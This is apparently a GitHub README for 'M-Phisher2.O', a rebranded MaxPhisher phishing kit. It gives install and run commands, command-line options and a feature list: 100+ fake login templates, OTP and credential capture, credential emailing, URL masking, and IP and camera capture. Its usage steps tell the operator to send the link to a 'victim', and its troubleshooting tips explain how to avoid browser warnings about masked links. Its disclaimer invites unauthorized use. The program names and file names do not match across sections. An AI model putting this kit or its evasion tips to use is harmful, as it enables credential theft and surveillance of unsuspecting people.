<h1 align="center">M-Phisher2.O</h1>

### [√] Description :

***A python phishing script for login phishing, image phishing, video phishing and many more***

### [+] Installation

##### Install primary dependencies (git, python)

 - For Debian (Ubuntu, Kali-Linux, Parrot)
    - ```sudo apt install git python3 php openssh-client -y```
 - For Arch (Manjaro)
    - ```sudo pacman -S git python3 php openssh --noconfirm```
 - For Redhat(Fedora)
    - ```sudo dnf install git python3 php openssh -y```
 - For Termux
    - ```pkg install git python3 php openssh -y```

##### Clone this repository

 - ```git clone https://github.com/LUCIFERGREYHAT1/m-phisher2.O```

##### Enter the directory
 - ```cd m-phisher2.O```

##### Install all modules
 - ```pip3 install -r files/requirements.txt```

##### Run the tool
 - ```python3 mphisher.py```

### Support

OS         | Support Level
-----------|--------------
Linux      | Excellent
Android    | Excellent
iPhone     | Alpha (Recommended docker)
MacOS      | Alpha (Recommended docker)
Windows    | Unsupported (Use docker/virtual-box/vmware)
BSD        | Never tested

#### Options

```
usage: maxphisher.py [-h] [-p PORT] [-t TYPE] [-o OPTION]
                     [-T TUNNELER] [-r REGION] [-S SUBDOMAIN]
                     [-d DIRECTORY] [-f FEST] [-i YTID] [-u URL]
                     [-s DURATION] [-m MODE] [-e TROUBLESHOOT]
                     [--nokey] [--noupdate]

options:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  MaxPhisher's server port [Default : 8080]
  -t TYPE, --type TYPE  MaxPhisher's phishing type index [Default :
                        null]
  -o OPTION, --option OPTION
                        MaxPhisher's template index [ Default : null ]
  -T TUNNELER, --tunneler TUNNELER
                        Tunneler to be chosen while url shortening
                        [Default : Cloudflared]
  -r REGION, --region REGION
                        Region for loclx [Default: auto]
  -S SUBDOMAIN, --subdomain SUBDOMAIN
                        Subdomain for loclx [Pro Account]
                        (Default: null)
  -d DIRECTORY, --directory DIRECTORY
                        Directory where media files will be saved
                        [Default : /sdcard/Media]
  -f FEST, --fest FEST  Festival name for fest template [Default:
                        Birthday]
  -i YTID, --ytid YTID  Youtube video ID for yttv template [Default :
                        6hHmkInZkMQ (NASA Video)]
  -u URL, --url URL     Redirection url for ip-tracking or login
                        phishing [Default : null]
  -s DURATION, --duration DURATION
                        Media duration while capturing [Default :
                        5000(ms)]
  -m MODE, --mode MODE  Mode of MaxPhisher [Default: normal]
  -e TROUBLESHOOT, --troubleshoot TROUBLESHOOT
                        Troubleshoot a tunneler [Default: null]
  --nokey               Use localtunnel without ssh key [Default:
                        False]
  --noupdate            Skip update checking [Default : False]
```

### Features:

 - Multi platform (Supports most linux)
 - 100+ templates
 - Concurrent 3 tunneling (Cloudflared and LocalXpose, LocalHostRun)
 - OTP Support
 - Credentials mailing
 - Easy to use
 - Possible error diagnoser
 - Built-in masking of URL
 - Custom masking of URL
 - URL Shadowing
 - Portable file (Can be run from any directory)
 - Get IP Address and many other details along with login credentials


### Requirements

 - `Python(3)`
   - `requests`
   - `bs4`
   - `rich`
 - `PHP`
 - `SSH`
 - 900MB storage
 
If not found, php, ssh and python modoules will be installed on first run

#### Tested on

 - `Termux`
 - `Ubuntu`
 - `Kali-Linux`
 - `Arch`
 - `Fedora`
 - `Manjaro`

## Usage

1. Run the script
2. Choose a Website
3. Wait sometimes for setting up all
4. Send the generated link to victim
5. Wait for victim login. As soon as he/she logs in, credentials will be captured

<h1 align="center">Example</h1>
 
## Solution of common issues
 - Some secured browsers like Firefox can warn for '@' prefixed links. You should use pure links or custom link to avoid it.
 - Termux from play store in not supported. Download termux from fdroid or github
 - VPN or proxy prevents tunneling and even proper internet access. Turn them off you have issues.
 - Some android requires hotspot to start Cloudflared and Loclx. If you face 'tunneling failed' in android, most probably your hotspot is turned off. Turn it on and keep it on untill you close MaxPhisher.
 - If you want mailing credentials then you need to use app password. Visit [here](https://myaccount.google.com/u/0/apppasswords) and generate an app password, put that in `files/email.json`. You may need to enable 2FA before it.

## [!] Disclaimer
***This tool is developed for educational purposes. Here it demonstrates how phishing works. If anybody wants to gain unauthorized access to someones social media, he/she may try out this at his/her own risk. You have your own responsibilities and you are liable to any damage or violation of laws by this tool. The author is not responsible for any misuse of MaxPhisher!***

### [*] Support
####  Want to show support? Just spread the word and smash the star button
###### Donate BTC: ***3Lx8ikQQgZZpmFJzHDBuQHXzLXMeWMcZF3***

## Credits:
[PyPhisher](https://github.com/KasRoudra/PyPhisher)
[CamHacker](https://github.com/KasRoudra/CamHacker)
[VidPhisher](https://github.com/KasRoudra/VidPhisher)
[IP-Tracker](https://github.com/KasRoudra/IP-Tracker)
[Storm-Breaker](https://github.com/ultrasecurity/Storm-Breaker)
[Seeker](https://github.com/thewhiteh4t/seeker)

## [~] Find Me on :

- [![Github](https://img.shields.io/badge/Github-SHAKTIBIPLAB-green?style=for-the-badge&logo=github)](https://github.com/LUCIFERGREYHAT1)

- [![Gmail](https://img.shields.io/badge/Gmail-SHAKTIBIPLAB-green?style=for-the-badge&logo=gmail)](mailto:shaktibiplab25@gmail.com)

- [![Telegram](https://img.shields.io/badge/Telegram-SHAKTIBIPLAB-indigo?style=for-the-badge&logo=telegram)](https://t.me/lifeisshorttisha)
